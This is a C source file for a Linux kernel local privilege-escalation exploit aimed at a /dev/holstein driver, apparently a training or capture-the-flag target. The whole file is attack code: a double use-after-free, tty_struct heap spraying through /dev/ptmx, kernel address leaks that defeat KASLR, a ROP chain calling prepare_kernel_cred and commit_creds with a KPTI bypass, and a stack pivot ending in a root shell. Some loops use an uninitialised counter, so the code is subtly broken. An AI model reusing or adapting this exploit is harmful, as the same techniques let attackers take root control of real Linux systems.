#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>


#define DEV_PATH "/dev/holstein"
#define ulong unsigned long
#define uint unsigned int
#define scu static const unsigned long

#define prepare_kernel_cred (kbase + 0x072560)
#define commit_creds (kbase + 0x0723c0)
#define rop_crash 0xdeadbeefcafebabe
#define rop_pop_rdi (kbase + 0x14078a)
#define rop_pop_rcx (kbase + 0x0eb7e4)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x638e9b)
#define rop_bypass_kpti (kbase + 0x800e26)
#define rop_pusj_rdx_xor_eax_415b004fh_pop_rsp_pop_rbp_ret (kbase + 0x14fbea)

ulong kbase;
ulong g_buf;
ulong user_cs,user_ss,user_rsp,user_rflags;

int spray[100];
char buf[0x400];

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] spawn root shell...");
  execve("/bin/sh", argv, envp);
}

void fatal(char *msg) {
  printf("[!] Error: %s\n", msg);
  exit(-1);
}

int main() {
  save_state();
  // Use After Free
  int fd1 = open(DEV_PATH, O_RDWR);
  int fd2 = open(DEV_PATH, O_RDWR);
  if (fd1 == -1 || fd2 == -1) {
    fatal(DEV_PATH);
  }
  close(fd1);// g_buf at kernel will be freed

  // heap spray (tty struct)
  for (int i; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }
  for (int i; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  // kernel address leak
  read(fd2, buf, sizeof(buf));
  ulong leak = *(ulong*)&buf[0x18];
  kbase = leak - 0xc39c60;
  printf("[i] kernel base: 0x%016lx\n", kbase);
  leak = *(ulong*)&buf[0x38];
  g_buf = leak - 0x38;
  printf("[i] g_buf: 0x%016lx\n", g_buf);

  // ROP Chain
  ulong *chain = (ulong*)&buf;
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;
  // fake tty_operations for stack pivot
  *(ulong*)&buf[0x3f8] = rop_pusj_rdx_xor_eax_415b004fh_pop_rsp_pop_rbp_ret;
  puts("[+] writing ROP chain and fake tty_operations");
  write(fd2, buf, sizeof(buf));
  // 2nd Use After Free
  int fd3 = open(DEV_PATH, O_RDWR);
  int fd4 = open(DEV_PATH, O_RDWR);
  if (fd3 == -1 || fd4 == -1) {
    fatal(DEV_PATH);
  }
  close(fd3);
  for (int i = 50; i < 100; i++) {
  spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
  if (spray[i] == -1)
    fatal("/dev/ptmx");
  }
  read(fd4, buf, 0x400);
  // overwrite function ptr
  *(ulong*)&buf[0x18] = g_buf + 0x3f8 - 0x8 * 12;
  puts("[+] overwriting function ptr");
  write(fd4, buf, 0x20);
  for (int i = 50; i < 100; i++) {
    ioctl(spray[i], 0, g_buf - 8); // rsp=rdx; pop rbp;
  }
}
